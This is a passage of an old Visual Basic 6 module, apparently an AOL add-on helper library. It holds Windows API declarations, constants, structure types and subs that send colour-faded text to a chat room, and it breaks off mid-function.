Attribute VB_Name = "KiN2000"


'******************************
'             Kin2000 Bas
'******************************
' Kin2000 Bas
'Coded By Edge & H8er and dedicated to All
'Advanced proggers
'=========================================

'  Werds from H8er & Edge
'Sup all this is our first bas.
'Just about anything u
'will ever need to make a great
'prog . There are examples and
'help in the bas on alot of the
'subs so it is easy for u to succed
'in makin an awesome prog
'some of the shit in our bas was
'taken outta other bas files and
'they were givin credit for it
'If u wanna use shit from our bas
'to make your own make sure u do
'the same for us .
'E-mail me at:
'h8er = cyberplaya@hotmail.com
'Edge = lordsol98@hotmail.com
'_____________________________
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function FindWindow Lib "User32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "User32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetMenu Lib "User32" (ByVal hWnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "User32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "User32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuString Lib "User32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetSubMenu Lib "User32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetWindowTextLength Lib "User32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Public Declare Function IsWindowVisible Lib "User32" (ByVal hWnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function MciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function PostMessage Lib "User32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function SendMessage Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SetCursorPos Lib "User32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowPos Lib "User32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "User32" (ByVal bShow As Long) As Long
Public Declare Function ShowWindow Lib "User32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function ReleaseCapture Lib "User32" () As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetCursorPos Lib "User32" (lpPoint As POINTAPI) As Long
Declare Function WindowFromPoint Lib "User32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Declare Function SetWindowLong& Lib "User32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long)
Declare Function Shell_NotifyIcon Lib "shell32.dll" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, lpData As NOTIFYICONDATA)
Declare Function GetKeyState% Lib "User32" (ByVal nVirtKey As Long)
Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Declare Function GetWindowWord Lib "User32" (ByVal hWnd As Long, ByVal nIndex As Long) As Integer
Declare Function GetParent Lib "User32" (ByVal hWnd As Integer) As Integer
Declare Function GetClassName& Lib "User32" Alias "GetClassNameA" (ByVal hWnd&, ByVal lpClassName$, ByVal nMaxCount&)
Declare Function GetWindowText& Lib "User32" Alias "GetWindowTextA" (ByVal hWnd&, ByVal lpString$, ByVal cch&)
Declare Function GetActiveWindow% Lib "User32" ()
Declare Function IsWindowEnabled Lib "User32" (ByVal hWnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "User32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "User32" (ByVal hWnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "User32" (ByVal hWnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "User32" (ByVal hWnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "User32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetPixelV Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Declare Function SetPixelFormat Lib "gdi32" (ByVal hDC As Long, ByVal n As Long, pcPixelFormatDescriptor As PIXELFORMATDESCRIPTOR) As Long
Declare Function SetPixel Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Declare Function SetParent Lib "User32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hWnd&)
Declare Function RegisterWindowMessage& Lib "User32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "User32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "User32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetAsyncKeyState Lib "User32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "User32" (ByVal hWnd As Long) As Long
Declare Function Rectangle Lib "gdi32" (ByVal hDC As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hWnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function SendMessageByString Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function CreatePopupMenu Lib "User32" () As Long
Declare Function GetPixel Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long) As Long
Declare Function GetPixelFormat Lib "gdi32" (ByVal hDC As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetTopWindow Lib "User32" (ByVal hWnd As Long) As Long
Declare Function SetFocusAPI Lib "User32" Alias "SetFocus" (ByVal hWnd As Long) As Long
Declare Function GetWindow Lib "User32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "User32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "User32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "User32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "User32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "User32" (ByVal hMenu%) As Integer
Declare Function GetWindowTextB Lib "User32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function EnableWindow Lib "User32" (ByVal hWnd As Long, ByVal cmd As Long) As Long
Declare Function StretchBlt Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal nSrcWidth As Long, ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long
Declare Function StretchDIBits Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal dx As Long, ByVal dy As Long, ByVal SrcX As Long, ByVal SrcY As Long, ByVal wSrcWidth As Long, ByVal wSrcHeight As Long, lpBits As Any, lpBitsInfo As BITMAPINFO, ByVal wUsage As Long, ByVal dwRop As Long) As Long
Declare Function GetDC Lib "User32" (ByVal hWnd As Long) As Long
Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconA" (ByVal hInst As Long, ByVal lpszExeFileName As String, ByVal nIconIndex As Long) As Long
Declare Function CopyIcon Lib "User32" (ByVal hIcon As Long)
Declare Function DestroyIcon Lib "User32" (ByVal hIcon As Long) As Long
Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, lpInitData As DEVMODE) As Long
Declare Function SelectObject Lib "gdi32" (ByVal hDC As Long, ByVal hObject As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Declare Function ReleaseDC Lib "User32" (ByVal hWnd As Long, ByVal hDC As Long) As Long
Declare Function DeleteDC Lib "gdi32" (ByVal hDC As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Declare Function GetClientRect Lib "User32" (ByVal hWnd As Long, lpRect As RECT) As Long
Declare Function ScreenToClient Lib "User32" (ByVal hWnd As Long, lpPoint As POINTAPI) As Long
Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function CreateEllipticRgnIndirect Lib "gdi32" (lpRect As RECT) As Long
Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function CreateRectRgnIndirect Lib "gdi32" (lpRect As RECT) As Long
Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Declare Function SetWindowRgn Lib "User32" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long

Public Const CCHDEVICENAME = 32
Public Const CCHFORMNAME = 32

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Const GWW_HINSTANCE = (-6)
Const GWW_ID = (-12)
Const GWL_STYLE = (-16)
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2
Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const flags = SWP_NOMOVE Or SWP_NOSIZE
Const SW_MINIMIZE = 6



Const SPI_SCREENSAVERRUNNING = 97

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230


Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const WM_SYSCOMMAND = &H112
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&


Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HFFFFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000

Public Type RGBQUAD
        rgbBlue As Byte
        rgbGreen As Byte
        rgbRed As Byte
        rgbReserved As Byte
End Type

Type NOTIFYICONDATA
        cbSize As Long
        hWnd As Long
        uID As Long
        uFlags As Long
        uCallbackMessage As Long
        hIcon As Long
        szTip As String * 64
End Type

Type DEVMODE
        dmDeviceName As String * CCHDEVICENAME
        dmSpecVersion As Integer
        dmDriverVersion As Integer
        dmSize As Integer
        dmDriverExtra As Integer
        dmFields As Long
        dmOrientation As Integer
        dmPaperSize As Integer
        dmPaperLength As Integer
        dmPaperWidth As Integer
        dmScale As Integer
        dmCopies As Integer
        dmDefaultSource As Integer
        dmPrintQuality As Integer
        dmColor As Integer
        dmDuplex As Integer
        dmYResolution As Integer
        dmTTOption As Integer
        dmCollate As Integer
        dmFormName As String * CCHFORMNAME
        dmUnusedPadding As Integer
        dmBitsPerPel As Integer
        dmPelsWidth As Long
        dmPelsHeight As Long
        dmDisplayFlags As Long
        dmDisplayFrequency As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
 End Type

Type BITMAPINFOHEADER
        biSize As Long
        biWidth As Long
        biHeight As Long
        biPlanes As Integer
        biBitCount As Integer
        biCompression As Long
        biSizeImage As Long
        biXPelsPerMeter As Long
        biYPelsPerMeter As Long
        biClrUsed As Long
        biClrImportant As Long
End Type

Type BITMAPINFO
        bmiHeader As BITMAPINFOHEADER
        bmiColors As RGBQUAD
End Type


Public Type BITMAP '14 bytes
        bmType As Long
        bmWidth As Long
        bmHeight As Long
        bmWidthBytes As Long
        bmPlanes As Integer
        bmBitsPixel As Integer
        bmBits As Long
End Type
Public Type BITMAPCOREHEADER '12 bytes
        bcSize As Long
        bcWidth As Integer
        bcHeight As Integer
        bcPlanes As Integer
        bcBitCount As Integer
End Type

Type RGBTRIPLE
        rgbtBlue As Byte
        rgbtGreen As Byte
        rgbtRed As Byte
End Type

Type BITMAPCOREINFO
        bmciHeader As BITMAPCOREHEADER
        bmciColors As RGBTRIPLE
End Type
Public Type BITMAPFILEHEADER
        bfType As Integer
        bfSize As Long
        bfReserved1 As Integer
        bfReserved2 As Integer
        bfOffBits As Long
End Type

Public Type BITMAPV4HEADER
        bV4Size As Long
        bV4Width As Long
        bV4Height As Long
        bV4Planes As Integer
        bV4BitCount As Integer
        bV4V4Compression As Long
        bV4SizeImage As Long
        bV4XPelsPerMeter As Long
        bV4YPelsPerMeter As Long
        bV4ClrUsed As Long
        bV4ClrImportant As Long
        bV4RedMask As Long
        bV4GreenMask As Long
        bV4BlueMask As Long
        bV4AlphaMask As Long
        bV4CSType As Long
        bV4Endpoints As Long
        bV4GammaRed As Long
        bV4GammaGreen As Long
        bV4GammaBlue As Long
End Type

Type COLORRGB
  red As Long
  green As Long
  blue As Long
End Type

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Public Type PIXELFORMATDESCRIPTOR
    nSize As Integer
    nVersion As Integer
    dwFlags As Long
    iPixelType As Byte
    cColorBits As Byte
    cRedBits As Byte
    cRedShift As Byte
    cGreenBits As Byte
    cGreenShift As Byte
    cBlueBits As Byte
    cBlueShift As Byte
    cAlphaBits As Byte
    cAlphaShift As Byte
    cAccumBits As Byte
    cAccumRedBits As Byte
    cAccumGreenBits As Byte
    cAccumBlueBits As Byte
    cAccumAlphaBits As Byte
    cDepthBits As Byte
    cStencilBits As Byte
    cAuxBuffers As Byte
    iLayerType As Byte
    bReserved As Byte
    dwLayerMask As Long
    dwVisibleMask As Long
    dwDamageMask As Long
End Type


Dim nXCoord(50) As Integer
Dim nYCoord(50) As Integer
Dim nXSpeed(50) As Integer
Dim nYSpeed(50) As Integer
'Pre-set 2 color fade combinations begin here
Sub BoldFadeBlack(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    l$ = Mid$(thetext, W + 5, 1)
    f$ = Mid$(thetext, W + 6, 1)
    b$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    h$ = Mid$(thetext, W + 10, 1)
    j$ = Mid$(thetext, W + 11, 1)
    K$ = Mid$(thetext, W + 12, 1)
    M$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & U$ & "<FONT COLOR=#222222>" & S$ & "<FONT COLOR=#333333>" & T$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & l$ & "<FONT COLOR=#666666>" & f$ & "<FONT COLOR=#777777>" & b$ & "<FONT COLOR=#888888>" & c$ & "<FONT COLOR=#999999>" & D$ & "<FONT COLOR=#888888>" & h$ & "<FONT COLOR=#777777>" & j$ & "<FONT COLOR=#666666>" & K$ & "<FONT COLOR=#555555>" & M$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & Q$ & "<FONT COLOR=#222222>" & V$ & "<FONT COLOR=#111111>" & Z$
Next W
SendChat (PC$)
'Code for the room shit will be
'Call Fadeblack(Text1.text)


'to make any of the subs werk in ims
'You will need 2 text boxes and a button
'Do the change below and copy that to your send button
   ' a = Len(Text2.text)
    'For B = 1 To a
        'c = Left(Text2.text, B)
        'D = Right(c, 1)
        'e = 255 / a
        'F = e * B
        'G = RGB(F, 0, 0)
        'H = RGBtoHEX(G)
    ' Dim msg
    ' msg=msg & "<B><Font Color=#" & H & ">" & D
    'Next B
   ' Call IMKeyword(Text1.text, msg)
'u can do it for mail too but
'that is harder and I will leave that to u
'to figure out
End Sub
Sub BoldFadeGreen(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    l$ = Mid$(thetext, W + 5, 1)
    f$ = Mid$(thetext, W + 6, 1)
    b$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    h$ = Mid$(thetext, W + 10, 1)
    j$ = Mid$(thetext, W + 11, 1)
    K$ = Mid$(thetext, W + 12, 1)
    M$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & U$ & "<FONT COLOR=#003300>" & S$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & l$ & "<FONT COLOR=#007700>" & f$ & "<FONT COLOR=#008800>" & b$ & "<FONT COLOR=#009900>" & c$ & "<FONT COLOR=#00FF00>" & D$ & "<FONT COLOR=#009900>" & h$ & "<FONT COLOR=#008800>" & j$ & "<FONT COLOR=#007700>" & K$ & "<FONT COLOR=#006600>" & M$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & Q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & Z$
Next W
SendChat (PC$)
End Sub
Sub BoldFadeRed(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    l$ = Mid$(thetext, W + 5, 1)
    f$ = Mid$(thetext, W + 6, 1)
    b$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    h$ = Mid$(thetext, W + 10, 1)
    j$ = Mid$(thetext, W + 11, 1)
    K$ = Mid$(thetext, W + 12, 1)
    M$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & U$ & "<FONT COLOR=#880000>" & S$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & l$ & "<FONT COLOR=#440000>" & f$ & "<FONT COLOR=#330000>" & b$ & "<FONT COLOR=#220000>" & c$ & "<FONT COLOR=#110000>" & D$ & "<FONT COLOR=#220000>" & h$ & "<FONT COLOR=#330000>" & j$ & "<FONT COLOR=#440000>" & K$ & "<FONT COLOR=#550000>" & M$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & Q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & Z$
Next W
SendChat (PC$)


End Sub
Sub BoldFadeBlue(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    l$ = Mid$(thetext, W + 5, 1)
    f$ = Mid$(thetext, W + 6, 1)
    b$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    h$ = Mid$(thetext, W + 10, 1)
    j$ = Mid$(thetext, W + 11, 1)
    K$ = Mid$(thetext, W + 12, 1)
    M$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & U$ & "<FONT COLOR=#00003F>" & S$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & l$ & "<FONT COLOR=#0000A5>" & f$ & "<FONT COLOR=#0000BE>" & b$ & "<FONT COLOR=#0000D7>" & c$ & "<FONT COLOR=#0000F1>" & D$ & "<FONT COLOR=#0000D7>" & h$ & "<FONT COLOR=#0000BE>" & j$ & "<FONT COLOR=#0000A5>" & K$ & "<FONT COLOR=#00008B>" & M$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & Q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & Z$
Next W
SendChat (PC$)

End Sub

Sub BoldFadeYellow(thetext As String)
A = Len(thetext)
For W = 1 To A Step 18
    ab$ = Mid$(thetext, W, 1)
    U$ = Mid$(thetext, W + 1, 1)
    S$ = Mid$(thetext, W + 2, 1)
    T$ = Mid$(thetext, W + 3, 1)
    Y$ = Mid$(thetext, W + 4, 1)
    l$ = Mid$(thetext, W + 5, 1)
    f$ = Mid$(thetext, W + 6, 1)
    b$ = Mid$(thetext, W + 7, 1)
    c$ = Mid$(thetext, W + 8, 1)
    D$ = Mid$(thetext, W + 9, 1)
    h$ = Mid$(thetext, W + 10, 1)
    j$ = Mid$(thetext, W + 11, 1)
    K$ = Mid$(thetext, W + 12, 1)
    M$ = Mid$(thetext, W + 13, 1)
    n$ = Mid$(thetext, W + 14, 1)
    Q$ = Mid$(thetext, W + 15, 1)
    V$ = Mid$(thetext, W + 16, 1)
    Z$ = Mid$(thetext, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & U$ & "<FONT COLOR=#888800>" & S$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & l$ & "<FONT COLOR=#444400>" & f$ & "<FONT COLOR=#333300>" & b$ & "<FONT COLOR=#222200>" & c$ & "<FONT COLOR=#111100>" & D$ & "<FONT COLOR=#222200>" & h$ & "<FONT COLOR=#333300>" & j$ & "<FONT COLOR=#444400>" & K$ & "<FONT COLOR=#555500>" & M$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & Q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & Z$
Next W
SendChat (PC$)

End Sub


Function BoldBlackBlue(text As String)
    A = Len(text)
    For b = 1 To A
